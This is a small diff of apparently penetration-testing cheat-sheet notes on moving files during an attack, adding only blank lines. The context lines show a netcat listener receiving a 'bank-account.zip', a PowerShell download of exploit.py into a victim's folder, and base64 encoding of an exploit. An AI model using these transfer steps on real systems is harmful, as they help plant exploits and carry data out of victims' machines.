@@ -51,9 +51,11 @@ Using MSF. Start MSF before starting these steps:
 	2. nc -nlvp 4444 > bank-account.zip
 	
 #Powershell
+
 	1. Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
 	
 #Base64
+
 	local system:
 	1. cat exploit.py |base64
 	
